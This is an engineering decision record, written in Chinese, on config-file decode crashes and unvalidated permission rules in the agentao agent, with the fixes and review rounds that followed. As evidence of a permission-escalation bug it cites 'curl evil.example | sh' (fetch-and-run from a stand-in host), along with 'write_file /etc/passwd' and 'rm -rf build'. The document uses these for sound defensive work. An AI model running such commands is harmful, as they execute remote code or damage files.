# pi-mono Pull 评审（2026-08-10 → 2026-08-20）

**状态：** 决策记录，**rev 5 —— 已于 2026-08-21 实现**（按 F2 → F1 顺序落地；见 §4 末尾的实现记录）。2026-08-21 基于 `../pi-mono` 中 176 个 commit / 278 个文件（`936aff009..5cd93f688`）起草，经反向评审，随后被维护者评审修订两轮：rev 2 判定 rev 1 的修复清单不完整且过度设计（附录 B）；rev 3 修掉了 rev 2 自身修复清单里的两处实现阻塞与三处事实/契约错误（附录 C）；rev 4 敲定了最后一处策略决策（未知 `action` → 拒绝）与两处范围边界；rev 5 修正了 rev 4 自己在 validator 分层上引入的一处回归。§4 即为可实施路线。
**读者：** 决定从 pi-mono 借鉴什么的 Agentao 维护者；接手 §4 的人。
**对应文档：** `pi-mono-pull-review-2026-08-21.md`。
**先前记录：** `pi-mono-pull-review-2026-08.md`、`pi-mono-borrow-review.md`、`pi-mono-tools-review.md`、`pi-mono-openai-stream-fix.md`。2026-08-09 那次 pull（PR #174）只存在于 session memory。
**相关：** `permission-hardening-plan.md` —— §2 是该计划已修复的一个 P0 的漏网同胞。`acp-client-audit.zh.md` §239 —— §4 终止路线的既有先例。
**方法：** 先给增量分类 → 按 harness/product 边界筛出候选 → 探针打在**公共 sink** 上而非私有 helper → 每条存活结论做反向评审 → 修复清单在实施前先过维护者评审。

---

## 1. 结论

**没有值得落地的 pi 借鉴项。** pi 的配置诊断簇（`1e1a6e27b`、`913bcf339`、`678f0af30`、`1355cd36e`）只是把调查引到了 agentao 自己的配置加载路径上。带回来的是两条 pi **并不存在**的 P1 缺陷，且都出自反向评审而非阅读 pi。

| # | 缺陷 | 爆点 |
|---|---|---|
| **D1** | `UnicodeDecodeError` 继承 `ValueError`，普查到的启动关键读取点都没接住它 | CLI 启动、`PermissionEngine.__init__`、ACP `session/new`、子 agent 派生 |
| **D2** | 权限规则从不校验 —— 无字段检查，无类型检查 | `decide_detail()`，**turn 中途**，首次工具调用时 |

修复项两条见 §4，已排除项十一条见 §5。降级条目、反向评审的五行勘误、以及 rev 1 被否决的路线都放进附录 —— 证据保留在那里以免被推翻的结论日后又被重提，同时不让一次 pull review 演变成权限系统重设计。

**窗口说明。** 触发问题是「今天（2026-08-21）的更新」。`git fetch origin main` 确认**没有 2026-08-21 的提交**；origin/main 顶端是 `5cd93f688`，2026-08-20 15:59。176 个 commit 里 15 个是 `chore: approve contributors`，约 20 个是 TUI 打磨，最大的簇是一次文档重写（删掉 `harness-v2`，新写 2941 行 `harness.md` 加 harness-v3 规格）。本窗口的 harness 层面积很薄。

---

## 2. D1 —— 多个启动关键配置读取点未捕获解码失败

`UnicodeDecodeError` 继承自 **`ValueError`** —— 不是 `OSError`，也不是 `json.JSONDecodeError`。下表普查到的读取点都只接住了后两者，于是一个非合法 UTF-8 的文件会直接穿透抛出。这是对**启动关键**读取点的普查，不是对全仓所有读取点的证明。

**范围规则。** 有 29 个第一方模块以 `encoding="utf-8"` 读 JSON。其中大多数读的是 **agentao 自己写出的文件**（session、replay JSONL、goal state、plan controller、memory）—— 这些不可能带上外来编码，全面扫荡属于做无用功。

下表是**已确认受影响的读取点，按启动影响筛选** —— 不是声称已覆盖 `docs/reference/configuration.md` 的全部人工配置。刻意未纳入的：

- **Run spec**（`configuration.md` §10）。`cli/run.py:193-197` 只接住 `read_text` 的 `OSError`，所以 UTF-16 的 spec 文件会绕过干净的 `_UsageError`（exit 2），以原始 traceback 暴露。同一缺陷，一个 `except` 子句的事 —— 未纳入仅因其退化是观感问题而非启动致命。但它的 `permissions: {allow, deny}` 块**在 F2 范围内**，经由 `add_run_rules()`。
- **plugin 自带的 `.mcp.json`**（第 4–5 行）**不是** `.agentao/mcp.json` —— 不同文件、不同信任类别。列入是因为它共享该缺陷，不是因为它是同一个面。
- **`plugins_config.json`、plugin manifest、hook 文件** —— 同属人工 JSON、同一缺陷类别，未普查。

| 配置 | 读取点 | 有 `exists`/`is_file` 预检查 | 接住 `UnicodeDecodeError` |
|---|---|---|---|
| `permissions.json` | `embedding/permission_loader.py:74-76` | **无** | 否 |
| | `cli/diagnostics/loaders.py:50-52` | 有 | 否 |
| `mcp.json` | `mcp/config.py:262-266` | 有 | 否 |
| | `embedding/plugins/mcp.py:117-119` | 有 | 否（告警时带路径） |
| | `embedding/plugins/manager.py:502-515` | 有 | 否（告警时带路径） |
| `settings.json` | `embedding/factory.py:39-43` | 有 | 否 |
| | `cli/app.py:387-391` | 有 | 否 |
| | `replay/config.py:109-114` | 有 | 否 |
| `acp.json` | `acp_client/config.py:41-49` | 有 | 否 —— 抛原始异常而非 `AcpConfigError` |
| `skills_config.json` | `skills/manager.py:151-157` | 有 | 否 |

rev 1 只点了其中三个，并声称问题已被治理。并没有：**`cli/app.py:387` 运行在 `AgentaoCLI.__init__` 内（`:287`），早于 factory 被调用** —— 所以一个 UTF-16 的 `settings.json` 无论 factory 怎么改都会杀死交互式启动。`cli/diagnostics/loaders.py` —— `agentao doctor` 背后的共享读取器 —— 有同样的洞，而它恰恰是用户遇到这类问题时会去用的那个工具。

### 可达性 —— 在公共 sink 上验证

把 `Path.home` 指向一个含 UTF-16LE `permissions.json` 的临时目录，对构造函数打探针：

```
PermissionEngine RAISED: UnicodeDecodeError: 'utf-8' codec can't decode byte 0xff in position 0
  File ".../pathlib.py", line 1029, in read_text
```

`load_permission_rules` 有**五个直接调用点**，所以这个崩溃被每一条 session 构造路径继承 —— `permissions.py:371`、`embedding/factory.py:181`、`agents/tools/_wrapper.py:559`（子 agent 派生）、`acp/session_new.py:367`、`acp/session_load.py:262`。`cli/diagnostics/collectors.py:101` 是**第六处，但它是镜像实现而非调用** —— 见 F1 的 doctor 例外条款，正是这份重复让那条例外变得承重。

### 不是假想的编码

Windows PowerShell 5.1 —— 在原装 Windows 上仍是默认 shell —— 的 `>` 和 `Out-File` 写出的是 **UTF-16LE**。一份本来合法的 JSON 里夹了 GBK 编码的中文注释同样会触发（已验证：`'utf-8' codec can't decode byte 0xa3`）。

### 漏网的同胞

`permission-hardening-plan.md` §P0（2026-05-04 落地）在下面一行发现并修复了**完全同一类**问题：

> `data.get("rules", [])` 位于一个**不捕获** `AttributeError` 的 `try/except (IOError, json.JSONDecodeError)` 中。顶层为 list / string / null 的合法 JSON 会让引擎初始化崩溃。

那次修复 —— 即现在 `permission_loader.py:78` 的 `isinstance(data, dict)` 守卫 —— 处理的是**解析后形状**的失败。**解码**失败发生在**更早**一行，在 `path.read_text(encoding="utf-8")` 上，被漏掉了。

---

## 3. D2 —— 权限规则从不校验

`PermissionEngine` 从一条规则上只读四个键 —— `tool`、`action`、`args`、`domain`（`permissions.py:498,508,512,527`）。从文件（或 host 的 `rules=` 入参）到引擎之间没有任何校验：未知字段被静默忽略，而且**从不检查类型**。

rev 1 把这称作「未知字段检查」就停下了。实测下来类型缺口才是更大的那一半 —— 而且它们**都不在启动期暴露**。它们暴露在 `runtime/tool_planning.py:494`，该处调用 `decide_detail()` 且**外面没有 `try`/`except`**，即 **turn 中途、首次工具调用时**：

| 非法规则 | 结果 |
|---|---|
| rule 不是 object | `AttributeError: 'str' object has no attribute 'get'` |
| `action` 不是字符串 | `AttributeError: 'int' object has no attribute 'lower'` |
| `args` 不是 object | `AttributeError: 'str' object has no attribute 'items'` |
| `domain` 不是 object | `AttributeError: 'str' object has no attribute 'get'` |
| `tool` 不是字符串 | `TypeError: first argument must be string or compiled pattern` |
| `args` 的**值**不是字符串 | `TypeError: first argument must be string or compiled pattern` |
| `domain.allowlist` 写成字符串而非列表 | **不报错 —— `deny` 规则静默降级为 ASK** |

字段那一半本身就是安全问题。条件键拼错的 `allow` 规则会丢掉条件，放大到整个工具：

```
{"tool":"run_shell_command","pattern":"^git ","action":"allow"}    # 打错了，应该是 "args"

  git status                -> ALLOW    （符合意图）
  curl evil.example | sh    -> ALLOW    （正确写法给的是 ASK）

  /permissions 显示为：        1. [✓ ALLOW] run_shell_command
```

一个单词的键名拼错就是一次**静默的权限放大**，而且显示成一条普通的 allow 规则。另外两例印证同一个「无校验」形状：`{"tools": "write_file", …}` 回落到 `rule.get("tool", "*")` 从而 **deny 所有工具**；`{"action": "alow"}` 落到 ASK 并原样渲染成 `[? ALOW]`。

**影响范围。** 不限于文件路径 —— `PermissionEngine(rules=[...])` 和 `add_run_rules(allow=, deny=)`（`permissions.py:388`）让原始规则字典走同一扇无校验的门，而 `agentao.host` 存在的意义恰恰就是让 host 来定策略。

**尚未被记录。** `permission-hardening-plan.md` §10 带着五条开放跟进项，规则校验不在其中。

---

## 4. 修复清单

**F1 与 F2 并不独立。** rev 2 一边声称二者独立，一边又要求 F2 的校验错误以 F1 的文件级配置错误形式抛出 —— 而当前数据流交付不了：`load_permission_rules` 返回的是裸规则字典，因此住在 engine 里的 validator 既分不清「文件规则」与「host 规则」，也拿不到路径。（`loaded_sources` 携带的是格式化过的 `"user:<path>"` 标签而非结构化路径，且 host 直接传 `rules=` 时它根本不存在。）

让两者都可实现的分层：

| 层 | 职责 |
|---|---|
| `permissions.py::validate_permission_rules(rules)` | 一个**纯规则列表 validator** —— 先校验 `rules` 是 list，再逐条校验字段 + 类型。返回结构化错误 **`(index: int \| None, reason)`**；`index=None` 只表示**集合本身**不是 list，那是唯一没有规则序号的失败。无 I/O，不知道路径，**也没有 JSON document 的概念** —— engine 从来拿不到 document。 |
| `permission_loader.py` | 承担一切 document 形状的事：校验顶层是 object、读 `data.get("rules", [])`、调用 validator，并把自身的 document 级失败与 validator 的规则级失败一并包装成 `PermissionConfigError(path, …)`。它是唯一知道路径的层。 |
| `PermissionEngine(rules=…)` / `add_run_rules()` | 直接调用同一个 validator，抛出不带路径的规则校验错误 —— 因为根本没有文件。 |

rev 4 曾一度把「文档是 object」这项塞进纯 validator。那是 rev 4 自己引入的分层回归：engine 收到的是规则**列表**、从来不是 document，所以一个同时覆盖两者的函数就得靠模式参数或多态输入去服务两个输入形状本就不同的调用方。document 形状属于唯一会读 document 的那一层。

**合并落地，或先落 F2 作为 F1 的前置依赖。** F1 单独落地产不出 §4 三态表所承诺的那条错误信息。

### F1 —— 配置编码处理，配一个三态契约

**前置条件，不是附带项。** `embedding/permission_loader.py` 是 §2 表中**唯一没有 `is_file()` 预检查**的读取点 —— 文件缺失目前是走 `OSError` 分支返回空。必须**先**补上这个预检查。没有它，下面的终止路线会让每一个没有 `permissions.json` 的用户都无法启动 agentao，而那是常态。

**不要自己发明形状 —— `cli/diagnostics/loaders.py:40-62` 已经有了对的那个**，应当向它收敛：它区分 `absent` / `unreadable` / `malformed`，并把路径放进消息里。`embedding/plugins/mcp.py:117` 和 `manager.py:502` 也已经在告警时带路径。

1. **用 `encoding="utf-8-sig"` 读取** §2 表中的每一个点。Python 这个 codec 会剥掉前导 BOM，没有 BOM 时逐字节等价，于是「带 BOM 但其余合法」的文件能正常加载而不是被丢弃。**仅用于读** —— `utf-8-sig` 用于**写**会主动写出一个 BOM。
2. **在既有类型旁加上 `UnicodeDecodeError`。** 优先写显式的 `(OSError, UnicodeDecodeError, json.JSONDecodeError)` 而不是 `(OSError, ValueError)`：`json.JSONDecodeError` 本身就继承 `ValueError`，宽写法会顺带吞掉无关的 `ValueError`。
3. **三态，按文件类别分流：**

   | 状态 | `settings.json`、`mcp.json`、`skills_config.json` | `permissions.json` |
   |---|---|---|
   | 不存在 | 静默，返回空 | 静默，返回空 |
   | 不可读 / 解码失败 / 非法 JSON | 带路径告警，回退为空 | **抛出带文件路径的配置错误；中止会话创建** |
   | schema 校验失败 | *不在范围内 —— 这些文件没有 validator* | **抛 `PermissionConfigError`（F2）** |

   第二行刻意比 rev 3 的「校验失败」更窄：F2 只为权限规则建 validator，而对没有 validator 的文件承诺校验语义，会把这条路线悄悄扩成一次配置系统重写。

   **已知、范围外、记录于此以免遗失：** 其余配置在上一层有**同一个**「异常类型没被接住」的缺陷，只是发生在形状而非编码上。顶层是 list 的 `mcp.json` 会让 `load_mcp_config` 抛出未捕获的 `AttributeError: 'list' object has no attribute 'get'`（已实测），`skills/manager.py::_load_config` 同样没有 `isinstance` 守卫。`embedding/factory.py:41` **有**守卫。这与 `permission-hardening-plan.md` 为 `permissions.json` 修掉的那个 P0 是同一族 —— 属于另案的廉价跟进，不属于 F1。**已被实现后评审推翻**（见实现记录之后的小节）：推迟它会让 F1 自己新写的 `configuration.md` 那一行不成立，因此这些守卫最终还是随 F1 一起落地。上面的推理保留为设计当时实际做出的决定。

   **例外条款 —— 诊断路径不得中止。** 上表说的是**运行时** loader。`agentao doctor`（以及未来任何 `config validate`）必须**接住**同一个失败，转成 error 级 Finding，并把报告跑完：用户最需要诊断的时刻，恰恰就是配置坏掉的时刻，一个提前退出的 doctor 比没有还糟。

   目前这还不是活的冲突 —— `collectors.py:101::_collect_permissions` 是**镜像**了 `load_permission_rules` 而非调用它，而且它本来就区分 missing 与 malformed。但这份重复是**风险而非安全垫**：F1 改掉运行时行为之后，镜像会继续报「正在被静默忽略」，而运行时其实已经中止了。**镜像必须在同一次改动里同步更新**，其措辞也要描述新行为。

   rev 1 写的是「继续吞掉异常，错的只是沉默」。这与本文档自己 §3 和附录 A 的证据相矛盾：权限规则一旦消失，`mcp_*` 的 deny 会让引擎返回 `None`，落到第三层，而 `trust: true` server 的工具（`requires_confirmation=False`）**无提示直接执行**。加日志堵不住这个洞。维护者评审给的路线 —— 策略文件 fail-closed，其余告警降级 —— 堵得住。

   这不是新约定：`acp_client/config.py:48-49` 对 `acp.json` 已经就是这么做的（`raise AcpConfigError(f"invalid JSON in {config_path}: {exc}")`），并在 `acp-client-audit.zh.md` §239 被记为刻意从严的选择。F1 是把 agentao 已有的约定用到最需要它的那个文件上 —— 顺带也修掉 `acp.json` 自己的解码洞：UTF-16 文件会绕过 `AcpConfigError`，以原始 traceback 的形式暴露。

**影响面 —— 这是一次已写入文档的契约变更，不只是行为变更。** `permissions.json` **已经**格式错误而本人尚未察觉的用户，会从「静默降级」变成「启动终止」。三样东西必须跟着动：

- **`tests/test_permissions_modes.py:280::test_invalid_json_user_config_graceful_fallback`** 断言了 `# should not raise` 与 `e.rules == []`。必须反转，并作为破坏性变更的验收测试。（rev 2 声称没有测试依赖现有行为 —— **错了**；产生该结论的 grep 搜的是 "malformed/corrupt"，而测试名叫 "invalid_json"。）`:288` 的 `test_stray_project_config_does_not_raise` **不受影响**：它传的是 `user_root=None`，而项目文件从来不是规则来源。
- **`docs/reference/configuration.md:130`** 写着这次要打破的契约 —— *「Missing file or malformed JSON → empty rule list (no startup error)」*。该行还写着一个**过期的 loader 路径**（`permissions.py::PermissionEngine._load_file`）；loader 早已迁到 `embedding/permission_loader.py`。同一次一并修掉。
- **`docs/reference/configuration.md:85`** —— settings.json 的 *「silently treated as `{}`」* 保住了「no startup error」那一半，但「silently」不再成立；措辞需更新。

**测试：** 输入用真实字节序列构造，不要用「复述判断」的手写字符串 —— `b"\xef\xbb\xbf" + body.encode()`、`codecs.BOM_UTF16_LE + body.encode("utf-16-le")`、一份真的带尾逗号的文档。断言：不存在 → 静默；BOM → **能加载**；UTF-16 → 带路径的类型化错误（策略文件）或带路径的告警（其余）。每个子句单独做反证。

### F2 —— 一个规则 validator，统一拒绝

一个小型 validator，字段**与**类型都完整覆盖，由**三处**共用：`permission_loader.py`（文件路径）、`PermissionEngine.__init__`（`rules=`）、`add_run_rules()`。

- **字段：** 合法键集封闭且很小 —— `tool`、`action`、`args`、`domain`（`domain` 内含 `url_arg` / `allowlist` / `blocklist`）。其余一律非法。
- **类型：** rule 是 object；`tool` 是字符串；`action` 是一个 `.lower()` 之后落在 `_ACTION_TO_DECISION` 三个键内的字符串（`allow` / `deny` / `ask`，`permissions.py:31-35`）。**大小写不是开放决策** —— `configuration.md:161` 已规定大小写不敏感；按 `.lower()` 校验并保持该契约；`args` 是 string→string 的 object；`domain` 是 object，其 `allowlist` / `blocklist` 是字符串列表，`url_arg` 是字符串。这才封掉 §3 那张表，包括让 deny 静默降级的 `allowlist` 写成字符串那一例。
- **第二处契约变更 —— 已定案，非开放。** 同一行 `configuration.md:161` 还规定了 *「unknown values treated as `ask`」*。**未知 `action` 值一律拒绝**，与本节的统一拒绝规则一致；**不**保留 `ask` 回退，因为正是它让 `{"action":"alow"}` 静默失效（§3）。按 F1 契约变更的同等做法改写该行并记 changelog。
- **统一拒绝。** 任何非法规则都拒绝，并报告**来源路径 / 规则序号 / 原因**（仅在确有文件时带路径 —— 见上面的分层表）。不做 `allow` 与 `deny` 的分支：rev 1 提议保留非法的 deny 规则，理由是「fail-closed 所以安全」，而它自己的证据就否掉了这一点 —— `{"tools": …}` 的拼错会把单工具 deny 放大成 **deny 所有工具**，那不是值得保留的状态。
- **不改展示层。** rev 1 需要 `get_rules_display()` 标出「条件被丢弃」的规则，这又需要一张 rejected-rules 附表。在构造期拒绝就同时消掉了这两样：展示层根本见不到非法规则。
- **错误落在哪：** 按分层表 —— 来自文件的规则在 loader 里变成 `PermissionConfigError(path, index, reason)`；来自 host 的规则（`rules=`、`add_run_rules()`，以及 run spec 的 `permissions: {allow, deny}`）在调用处抛出不带路径的规则校验错误。策略文件既然 fail-closed，统一拒绝就没有静默降级的坑可掉。

**值得点名的附带效果：** 这同时消掉了 `tool_planning.py:494` 的 turn 中途 `AttributeError` / `TypeError`。目前一条非法规则能活过构造期，然后在首次工具调用时于权限热路径上引爆 —— 此时用户已经付出了一个 turn。

**文件：** `agentao/permissions.py`（validator + `rules=` 与 `add_run_rules()` 两个调用点）、`agentao/embedding/permission_loader.py`（调用 validator 并把失败包装成 `PermissionConfigError`）。

### 实现记录（2026-08-21）

按分层表先落 F2、后落 F1。全量测试 **3984 passed, 1 skipped**；`ruff check .` 全绿。

| 位置 | 内容 |
|---|---|
| `permissions.py` | `validate_permission_rules(rules)`（纯函数、对外）、`PermissionRuleError`、`format_permission_rule_errors`。接入 `PermissionEngine.__init__(rules=)` 与 `add_run_rules()` |
| `embedding/permission_loader.py` | `PermissionConfigError(path, reason, errors=)`；`is_file()` 前置检查；`utf-8-sig`；document 形状 + `data.get("rules", [])` + 路径包装 |
| 其余 8 个读取点 | `utf-8-sig` + 显式 `UnicodeDecodeError`；原本静默吞掉的改为带路径告警 |
| `cli/diagnostics/collectors.py` | 镜像实现同批更新：跑同一个 validator，所有失败降级为 Finding，绝不中止 |
| `tests/test_config_encoding.py`（23）、`tests/test_permission_rule_validation.py`（44） | 新增 |
| `tests/test_permissions_modes.py` | `test_invalid_json_user_config_graceful_fallback` → `test_invalid_json_user_config_fails_closed` |
| `docs/reference/configuration.{md,zh.md}` | §3/§4/§5/§6/§7 失败行为；过期的 `PermissionEngine._load_file` loader 名；`action` 行的两半；封闭键集合 |

设计稿未指定、实现时定下的四件事：

1. **`add_run_rules` 对 `deny` 与 `allow` 分别校验**，错误标注为 `permissions.deny[i]` / `permissions.allow[i]`，使 index 能映射回 spec 作者实际书写的块。两次校验都在**任一列表被应用之前**完成 —— 半装上的 run 策略比没有更糟。
2. **在 `cli/diagnostics/loaders.py` 里，解码失败归入 `malformed` 而非 `unreadable`。** 该模块的 `FileStatus` 区分的是文件系统错误与内容错误；解不出来的字节属于内容。
3. **断言四套内置 preset 全部通过 validator** —— 它必须接受 agentao 自己发布的规则。
4. **`PermissionRuleError` 与 `PermissionConfigError` 是两个独立类型**，不是父子：后者还覆盖规则校验之前就发生的失败（解码、非法 JSON、顶层非 object）。

仍按既定范围未做：run spec 自身的文件读取（`cli/run.py:193`，仅观感问题 —— 其 `permissions:` 块**已**通过 `add_run_rules` 覆盖）；plugin manifest 与 hook 文件；以及 library 模块告警的 console/stderr handler 策略（见下）。

### 实现后评审（2026-08-21）

对该 diff 跑了一轮 `/code-review --fix`，查出**10 处正确性缺陷，全部已修**；测试 3991。其中 4 处涉及安全，且有 2 处是**本次改动自己造成的**：

1. **document 键集合没有封闭** —— `{"rule": [...]}` 能解析，`data.get("rules", [])` 返回 `[]`，所有规则被丢光，而 `active_permissions()` 仍把该文件列为已加载。这是在唯一一个为 fail closed 而写的 loader 里出现的**静默 fail-open**。现在未知顶层键会抛错；`{}` 仍是合法的空策略。
2. **`tool` 与 `action` 没有校验*是否存在*。** 上面 §4 规定的是类型与封闭键集合，我也正是照此实现 —— 但 `{"action": "allow"}` 根本没有未知键可供拦截，于是它顺利通过新 validator，并经 `rule.get("tool", "*")` 变成「放行一切」（实测：`write_file /etc/passwd` → ALLOW）。**封闭键集合本身并不能堵住放宽漏洞。** 现在两者均为必填；这是**恢复**契约而非改变契约 —— `configuration.md` §4 的字段表早就标着 `required: yes`。
3. **`add_run_rules()` 开始抛异常，而 `cli/run.py` 的调用点没有兜底** —— 坏的 spec `permissions:` 块会以 traceback 逃逸，而不是文档规定的 `invalid_spec` 信封 / exit 2。
4. **我自己新增的三个「告警并降级」点，遇到非 object 文件仍会崩**（`mcp.json`、`cli/app.py` 的 `settings.json`、`skills_config.json`），并且 `cli/app.py` 的告警把未转义的路径插进 Rich markup —— 一条告警路径自身可能抛 `MarkupError`。

此外：doctor 镜像漏了 document 键检查，也漏了「规则非法」情形下的「将无法启动」提示；`plugins_config.json` 存在完全相同的 `UnicodeDecodeError` 漏洞，位置就在本 diff **已修**的那处上方 70 行。

**评审做出的两个 §4 曾明确推迟的范围决定**，之所以保留，是因为不做就会让本次改动自己新写的文档变成假话：`mcp.json` / `settings.json` / `skills_config.json` 的 `isinstance(data, dict)` 保护（F1 §3 称其为「另案的廉价后续」），以及 `plugins_config.json` 的编码修复（§2 列为未普查）。两者都是一行改动，都没有引入 validator；不做的话，本次给 `configuration.md` 添的「→ 告警并退回默认值」那一行就不成立。

**刻意未修：** library 模块的告警只能经 Python 的 `lastResort` 到达终端，也就是只在尚未挂上任何 handler 时。实际效果是 `settings.json` 的读取可见，而 `mcp.json` / `skills_config.json` 只进 `agentao.log`。给 `agentao` logger 配 console handler 是 handler 策略决策，不属于本 diff；文档已改为陈述实际行为。另有两条 reuse/altitude 建议（共用编码提示常量、把 `_load_json_object` 泛化成唯一的配置读取器）同样否决：它们的正确归属地跨越 PR #175 守卫所管的 `core → embedding` 方向，需要的是分层决策而非机械搬迁。

### Codex 评审（2026-08-21，修复轮之后）

针对同一份 diff 的第二位独立评审者。**2 条发现，均为 P2，均已修**（测试 4000）：

1. **run spec 的权限校验位于 `build_from_environment()` 之后。** 上一轮评审把它从「traceback」改成了「`invalid_spec` 信封」，却仍留在构造下游 —— 于是任何无关的构造失败都会先报出，把 exit 2 又变回 exit 1；即便在成功路径上，也是先把整个 runtime 及其落盘副作用建好，再去拒绝一开始就非法的输入。现在改到 `_execute_run` 中与其他 spec 检查并列、在任何 runtime 存在之前完成；两处共用一个 `_spec_engine_rules()` 转换器以防漂移，构造后的处理器明确降级为兜底。
2. **新的错误文本可能把显示它的代码搞崩。** 校验会原样引用出错的键名，因此一个名为 `[/oops]` 的规则字段会以 markup 形式抵达 Rich。上一轮评审转义了 `cli/app.py` —— 但没有转义真正渲染**这个**错误的两处边界：交互式 `Fatal error:` 处理器与 `agentao doctor` 的 `_render_human`。两者都会抛 `MarkupError`，取代本该出现的类型化错误 / 完整报告。现在两处所有动态值（路径、环境值、异常文本、Finding 消息）全部转义；fatal-handler 测试改为驱动 `main()` 本身，而不是复述它的格式串。

**这两条都是上一轮评审自身修复的二阶缺陷** —— 链条已经三层深：F2 的规格 → 堵它的修复 → 堵那个修复的修复。每一次起作用的都是**换一位评审者**，而不是同一位更仔细地再看一遍。

**与前五轮不同的一条教训：** 修复清单被评审了五轮，仍然发出了一个 fail-open 和一次提权。两者都源于**严格照规格实现** —— 封闭键集合 + 类型校验 —— 却没有重新追问规格是**为了什么**。rev 1 的教训是「对补救方案重做可达性验证」；这一条是「对补救方案重做**针对威胁的完备性**验证，而不是针对它自己的措辞」。

---

## 5. 不适用 —— 已核实

| pi 变更 | agentao 现状 | 查询 / 证据 |
|---|---|---|
| `90305d90a` 摘要时禁用工具 | **两半都已对齐** | `context_manager.py:593` 已传 `tools=None`；空响应那一半在 `:413-415` 处理 |
| `5093641a5` Google length 停止被 `toolUse` 覆盖 | 结构上不可能 | agentao 从不根据「有没有 tool call」合成 `finish_reason`。已在代码中核实：`_runner.py:443-452` → `_handle_length_truncated_tool_calls` 拒绝执行。`_LENGTH_FINISH_REASONS` 大小写不敏感匹配（`:41,53-57`），Gemini 的 `MAX_TOKENS` 会命中 |
| `541045ae0` `defaultTools` 误删 extension 工具 | 已对齐 | `tooling/registry.py:212-218` 跳过 `mcp_*`、plan-only 与 `extra_tools`；已写在 `host-tool-allowlist.md` |
| `2ff8ba622` `/model` `/thinking` 保持会话级 | 从来没有这个 bug | `grep "settings.json" agentao/cli/commands/provider.py` → 0 命中 |
| `ca21c1686` 单个 edit 输入的形状纠正 | 不存在该形状 | `EditTool.execute(file_path, old_text, new_text, replace_all)` —— 扁平标量。agentao 用 `runtime/arg_repair.py` 泛化了这一类，pi 没有对应层 |
| `8c2529dae` 不要把根目录 `.md` 当 skill 加载 | 结构上不可能 | agentao 只发现 `skills/<name>/SKILL.md` 子目录 |
| `5e11f6586` 嵌套 markdown skill | pi 的 package-manager 专有 | agentao 无对应物 |
| `98145a6c0` Bedrock 工具参数空键 | Bedrock Converse 序列化 | agentao 只走 OpenAI-compat |
| `8af7690c4` / `e3798ca91` 子 agent 信任 + 配置继承 | 超出范围，且已记录 | 两条都落在 `examples/extensions/subagent/index.ts`，不在 pi 核心。见 `agent-definition-trust-line.zh.md` 与 `openworker-borrow-review.zh.md` §1 |
| `b7bb00b93` / `4ca636c5e` reasoning detail 回传 | 相邻，方向相反 | pi 修的是**同一会话内**的转发；PR #177 清的是**跨切换**的残留。agentao 通过 `model_dump()` 转发 |
| `df018b602` `7d8c11d37` `b3edf0170` `086c32e74` | 无对应物 | pi 的模型目录 / Copilot 登录机制；agentao 没有模型目录 |

**是决策，不是推荐。** 本次增量最大的簇是文档重写 —— 删除 `harness-v2.md`（4612 行）及两个附属文档，新写 `harness.md`（2941 行）与一份 harness-v3 存储/运行时重设计。处置与 2026-08 那次评审对 lanes 和持久化操作的判断一致：一份需要知晓的提案，不是可以切下来的一块。

---

## 附录 A —— 降级条目与勘误

保留于此，以免被推翻的结论日后又从记忆里被重提。

### A1. 格式错误 / 带 BOM 的配置丢弃全部规则（P2 —— 已并入 F1）

在 `load_permission_rules(project_root=…, user_root=<home>/.agentao)` 上实测：

```
plain   -> rules=[{'tool': 'run_shell_command', ...}]  sources_len=1
bom     -> rules=[]                                    sources_len=0
comma   -> rules=[]                                    sources_len=0
```

`mcp.json` 与 `settings.json` 同理。这是 hermes 7/9 开放条目（「permissions.json 格式错误时要告警」）的第 2 个独立同行数据点；pi 补上了那条记录没有指定的两半 —— 消息里带路径，以及启动时暴露。F1 已涵盖它。

**「fail-open」说过头了**，而精确的形状恰恰是 F1 对 `permissions.json` 区别对待的依据：

| 工具调用 | 规则已加载 | 规则被丢弃 |
|---|---|---|
| `run_shell_command` `ls -la` | ALLOW | ALLOW |
| `run_shell_command` `git push …`（用户 deny） | DENY | **ASK** |
| `run_shell_command` `rm -rf build` | DENY | DENY —— 预设 `permissions.py:249`，与用户规则**和** hardline 扫描器都无关 |
| `mcp_github_create_issue`（用户 deny） | DENY | **None** → 第三层 → `trust:true` 工具无提示执行 |

### A2. 压缩失败的信号（P3 —— 暂不排期）

`_maybe_full_compress` **无条件**发 `CONTEXT_COMPRESSED` —— 含失败路径，以及熔断器打开之后 —— 形状是成功事件（`pre_msgs == post_msgs`，无 `ok`/`error` 字段）。host 只能靠比对计数推断失败。CLI 侧没有消费者打印它（`grep CONTEXT_COMPRESSED agentao/cli/` → 0 命中），所以自动路径对用户静默，而手动 `/compact` 会正确报告「什么都没产出」（`cli/commands/compact.py::_produced_fresh_compaction`）。pi 的 `a6b1dbceb` 形状是对的 —— 一个可区分的 `compaction_failed`。

### A3. 勘误 —— 第一轮的五处错误

| # | 结论 | 更正 |
|---|---|---|
| 1 | `.agentao/permissions.json` 里的 deny 规则被静默吞掉 | 文件搞错了。项目级是**刻意不采纳**且本来就告警（`permission_loader.py:52-61`）；只有 `<home>/.agentao/permissions.json` 是来源 |
| 2 | 丢弃规则是 fail-open | 说过头了。shell/web 是 DENY→**ASK**；`rm -rf` 仍由预设 DENY。真正的静默 fail-open 只有 `mcp_*` |
| 3 | Windows 编辑器默认带 BOM | 对 2026 年而言说满了。真正承重的是 PowerShell 5.1 的 UTF-16LE |
| 4 | host 契约上没有压缩事件 | 错了。`CONTEXT_COMPRESSED` 在 `transport/events.py:36`，发出于 `replay/observability.py:47`，录入 `adapter.py:411` |
| 5 | 熔断后上下文无界增长 | 错了。`microcompact_messages` 是非 LLM 的（`context_manager.py:282-289`），且与 `_consecutive_compact_failures` 无关 |

### A4. 过程记录

**错误 2 来自一个复述自身判断的手写 fixture。** 探针用了 `{"tool": …, "pattern": …}`，而引擎的条件键是 `args`。未识别的键被静默忽略，于是那份 fixture 里每条规则都放大成了整工具匹配，「规则已加载」那一列全是假象。这个 fixture bug 和 D2 是同一个事实的两面 —— 评审者把一条权限规则打错了，引擎默默接受了，直到出现自相矛盾的测量结果（`ls -la → DENY`）才暴露。这是 F2 值得做的最强论据：这个失效模式把它自己的评审者也坑了。

**错误 4 和 5 同源** —— grep 了契约被*记录*的模块，而不是事件被*发出*的模块。`agentao/host/` 是公共面，事件铸造在 `transport/` 和 `replay/observability.py`。要下「不存在这个事件」的判断，需要的是 emit 点的 grep。

## 附录 B —— rev 1 被否决的修复清单

记录于此，以免该路线被重新提出。rev 1 因五点被否决，全部已核实：

